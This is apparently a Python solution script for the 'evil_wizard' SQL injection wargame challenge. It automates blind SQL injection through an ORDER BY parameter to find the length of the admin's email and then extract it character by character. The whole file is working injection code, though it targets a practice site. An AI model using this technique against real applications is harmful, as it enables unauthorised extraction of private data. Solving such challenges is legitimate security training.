import requests
from settings import session_id


# 기본 설정
url = "https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php"
cookies = {'PHPSESSID': session_id}


# 이메일 자릿수 확인
# - 4부터 50까지 테스트
def find_email_length():
    for n in range(4, 31):
        payload = f"?order=if(id='admin' and length(email)={n},score,1000)"
        res = requests.get(url + payload, cookies=cookies)
        # 결과 텍스트에 admin이 먼저 나오는지 확인한다.
        if "</th><tr><td>admin" in res.text:
            return n
    return


# 구한 이메일 길이 값을 가지고 이메일 값을 구하는 함수
def find_email(length):
    email = str()
    for i in range(1, length + 1):
        for j in range(32, 127):
            # 이메일의 각 자리 값을 순회하며 확인한다.
            payload = "?order=if(score=50 and (ord(substr(email,{0},1))={1}),1,11)%23".format(i, j)
            res = requests.get(url + payload, cookies=cookies)

            # 결과 텍스트에 admin이 먼저 나오는지 확인한다.
            if "</th><tr><td>admin" in res.text:
                char = chr(j)
                email += char
                print(email)
                break
    return email


email_length = find_email_length()
print(f"Email length: {email_length}")
email = find_email(email_length)
print(f"Email: {email}")
